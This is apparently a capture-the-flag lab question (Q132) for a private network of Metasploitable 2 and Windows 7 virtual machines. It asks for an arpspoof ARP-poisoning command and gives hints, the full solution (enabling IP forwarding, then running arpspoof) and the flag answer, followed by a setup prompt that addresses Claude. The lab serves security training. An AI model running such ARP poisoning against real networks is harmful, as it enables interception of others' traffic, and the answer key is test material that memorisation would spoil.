# Q132 — arpspoof Single-direction

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2); `192.168.52.130` (Windows 7) |
| **Domain** | 07 — Sniffing / 14 — Wireless |
| **Difficulty** | 🟡 Medium |
| **Tools** | `tcpdump`, `wireshark`, `ettercap`, `bettercap`, `aircrack-ng` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use `arpspoof` (dsniff) to poison Metasploitable telling it Win7 MAC = Parrot. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=sudo arpspoof -i eth0 -t 192.168.52.129 192.168.52.130`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`-t <victim> <gateway-or-other-host>`
</details>

<details>
<summary>Hint 2</summary>

Enable forwarding.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t 192.168.52.129 192.168.52.130
```

Poisons one direction.

**Answer:** `cmd=sudo arpspoof -i eth0 -t 192.168.52.129 192.168.52.130`

📖 Ref: [tools/arpspoof.md](../../tools/arpspoof.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q132".
```
